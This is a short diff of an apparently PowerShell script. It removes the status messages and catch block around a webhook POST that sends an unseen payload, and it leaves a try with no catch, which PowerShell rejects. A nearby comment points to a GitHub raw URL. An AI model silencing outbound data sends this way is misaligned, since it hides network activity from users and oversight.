@@ -75,11 +75,7 @@ $payload = @{
 # Send webhook
 try {
     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
-    Write-Host "[+] Webhook sent successfully." -ForegroundColor Green
-} catch {
-    Write-Host "[!] Failed to send webhook." -ForegroundColor Red
-}
-
+} 
 # ----------- WEBHOOK BLOCK END -----------
 
 # Correct GitHub raw URL
